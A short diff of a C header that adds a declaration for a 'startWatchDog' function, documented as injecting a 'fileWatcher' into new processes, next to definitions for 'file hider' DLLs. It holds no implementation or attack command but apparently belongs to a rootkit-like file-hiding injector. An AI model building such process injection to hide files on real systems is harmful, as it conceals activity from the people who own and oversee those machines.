@@ -20,6 +20,14 @@
 #define FILE_HIDER_64_DLL   FILE_HIDER L"64.dll"
 #define FILE_HIDER_32_DLL   FILE_HIDER L"32.dll"
 
+/**
+* @brief      Makes sure that fileWatcher is injected into new processes as well.
+* @param      serviceStopEvent - an event that signals the watchdog to stop
+* @return     TRUE iff the watchdog was ran successfuly
+*/
+BOOL startWatchDog(HANDLE serviceStopEvent);
+
+
 BOOL initFiles();
 
 /**
